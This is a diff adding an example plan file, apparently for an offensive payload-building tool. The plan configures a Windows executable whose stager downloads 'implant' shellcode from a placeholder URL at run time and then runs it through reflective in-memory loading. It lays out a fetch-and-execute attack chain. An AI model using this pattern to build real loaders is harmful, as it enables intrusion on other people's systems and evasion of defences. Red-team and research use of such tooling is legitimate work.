@@ -1,0 +1,30 @@
+# Network stager: fetch a payload at run time instead of embedding it.
+#
+# The `network_stager` step downloads `implant` and hands it to the next
+# Execution step; `build.payloads.implant.source` is ignored for a staged payload
+# (the URL in the stager's `params` is what is fetched). The packed artifact
+# contains no embedded payload, only the stager and the runner.
+#
+#   cargo run -- build examples/plans/network-stager.yaml
+#
+# (The stub fetches at run time, so nothing is downloaded by the build itself.)
+
+schema: 6
+name: network-stager
+
+build:
+  payloads:
+    implant:
+      source: "https://example.invalid/implant.bin" # ignored: staged at run time
+      format: shellcode
+  output:
+    path: ./dist/stager_shellcode.exe
+
+runtime:
+  - technique: network_stager
+    params:
+      payload: implant
+      url: "https://example.invalid/implant.bin"
+  - technique: reflective_loading
+    params:
+      payload: implant
